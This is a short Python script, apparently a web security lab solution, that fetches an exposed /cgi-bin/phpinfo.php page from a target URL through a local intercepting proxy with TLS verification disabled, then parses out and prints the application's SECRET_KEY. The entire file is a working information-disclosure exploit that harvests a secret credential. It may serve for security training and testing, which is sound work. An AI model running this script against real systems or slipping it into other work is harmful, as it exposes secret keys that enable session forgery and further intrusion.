import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_secret_key(url):
    uri = "/cgi-bin/phpinfo.php"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    response = r.text
    soup = BeautifulSoup(response, "html.parser")
    s = soup.find("td", string=re.compile(r"SECRET_KEY"))
    secret_key = s.nextSibling.text
    return secret_key.strip()

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    secret_key = get_secret_key(url)
    print("[+] Testing for a 'Information disclosure vulnerability'...")
    print("[+] SECRET_KEY is %s" % secret_key)


if __name__ == "__main__":
    main()